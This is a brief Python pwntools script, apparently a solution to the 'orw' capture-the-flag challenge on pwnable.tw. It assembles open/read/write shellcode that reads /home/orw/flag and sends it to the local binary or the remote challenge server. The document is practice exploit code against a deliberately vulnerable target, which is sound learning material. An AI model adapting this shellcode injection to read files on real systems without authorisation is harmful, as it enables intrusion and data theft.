from pwn import *

e = ELF("./orw")
if "--remote" in sys.argv:
  p = remote("chall.pwnable.tw", 10001)
else:
  p = process(e.path)

pay = asm(shellcraft.open("/home/orw/flag"))
pay += asm(shellcraft.read("eax", "esp", 0x100))
pay += asm(shellcraft.write(1, "esp", 0x100))

p.send(pay)

p.interactive()
